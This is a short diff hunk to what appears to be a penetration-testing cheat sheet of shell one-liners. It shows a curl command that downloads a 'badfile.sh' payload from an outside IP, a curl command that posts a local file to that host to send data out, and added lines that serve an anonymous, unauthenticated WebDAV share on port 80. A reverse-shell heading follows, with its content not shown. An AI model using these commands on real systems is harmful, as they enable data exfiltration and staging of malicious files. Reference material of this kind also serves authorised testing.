@@ -9,6 +9,10 @@ curl -L http://192.168.12.34/badfile.sh > badfile.sh
 #Send data out over HTTP
 curl --data @/tmp/badfile http://192.168.12.34:8008/
 
+#Create WebDAV share with wsgidav:
+mkdir /home/user/webdav_share
+/home/user/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/user/webdav_share/
+
 ----
 
 ##Reverse shell
